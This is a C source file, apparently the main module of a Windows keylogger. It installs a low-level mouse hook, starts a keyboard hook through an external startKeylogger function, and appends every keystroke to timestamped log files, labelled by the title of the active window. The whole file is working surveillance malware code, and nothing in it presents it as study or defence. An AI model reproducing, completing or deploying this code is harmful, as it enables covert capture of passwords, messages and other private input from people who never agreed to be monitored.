#include "keylogger.h"
#include <stdio.h>
#include <time.h>

char lastWindowTitle[1024] = {0}; //the title of the window that was active the last time that the callback was called.
char path[44] = {0}; //the path of the file to log
u8 shouldDoCursorEnter = 0; //do we need to print an enter (\n)?
u8 firstTime = 1; //is the first time that the callback is called?
HHOOK mouseHook; //the mouse hook

/*
    The handler of the mouse hook
    code: the action code
    wParam: the event
    lParam: not used
*/
LRESULT CALLBACK mouseMoveHook(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        //if the user left or right clicks, mark the flag to log an enter
        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) shouldDoCursorEnter = 1;
    }
    return CallNextHookEx(mouseHook, code, wParam, lParam);
}
/*
    The callback function that will log all the user's keyboard activity
    c: a buffer with the processed key press
*/
void recordInFileCallback(char* c) {
    //open the file to log
    FILE* f = fopen(path, "ab");
    if (!f) {
        log("Cannot open the file %s. Exiting...", path)
        exit(1);
    }
    fseek(f, 0, SEEK_END); //seek to the end of the file

    char currentWindowTitle[1024] = {0};
    HWND current = GetForegroundWindow();
    GetWindowText(current, currentWindowTitle, 1024);
    if (strcmp(currentWindowTitle, lastWindowTitle) != 0 || firstTime == 1) { //if the active window changed or is the first time that the callback is executed
        //Get the new window title
        memset(lastWindowTitle, 0, 1024);
        if (strcmp(currentWindowTitle, "") == 0) { //if the current window has no title, use Untitled window
            strcpy(lastWindowTitle, "[Untitled window]");
        } else { //else, use the window's title
            strcpy(lastWindowTitle, currentWindowTitle);
        }
        memset(currentWindowTitle, 0, 1024);
        memset(currentWindowTitle, '=', strlen(lastWindowTitle) + 1);
        if (firstTime == 0) fwrite("\n\n", 2, 1, f); //if is not the first time, log two enters
        //now, log the new window title and some enters
        fwrite(lastWindowTitle, strlen(lastWindowTitle), 1, f);
        fwrite("\n", 1, 1, f);
        fwrite(currentWindowTitle, strlen(currentWindowTitle), 1, f); //this is to underline with = the window title
        fwrite("\n\n", 2, 1, f);
        firstTime = 1; //mark as the first time that the callback was executed
        shouldDoCursorEnter = 0; //and make sure that no additional enters will be logged.
    }
    if (shouldDoCursorEnter == 1) { //if an enter should be logged and is not the first time, log the enter
        shouldDoCursorEnter = 0;
        if (firstTime == 0) {
            fwrite("\n", 1, 1, f);
        }
    }
    firstTime = 0;
    fwrite(c, strlen(c), 1, f); //log the processed key
    fclose(f); //close the file
}

//The main function.
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    log("Keylogger started.");
    log("Getting date and time...")
    time_t timer;
    struct tm* tmInfo;
    time(&timer);
    tmInfo = localtime(&timer);
    strftime(path, 32, "logs\\%Y-%m-%d %H.%M.%S.txt", tmInfo);
    log("Creating %s", path);
    CreateDirectory("logs", NULL);
    FILE* f = fopen(path, "wb");
    if (!f) {
        log("Cannot create %s", path);
        return 1;
    }
    fprintf(f, "Starting the log file here.\n\n");
    fclose(f);
    log("Setting the mouse hook...");
    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, mouseMoveHook, hInstance, 0);
    log("Starting keylogger...");
    startKeylogger(hInstance, recordInFileCallback);
    log("Unhooking the mouse hook and exiting...");
    UnhookWindowsHookEx(mouseHook);
    return 0;
}
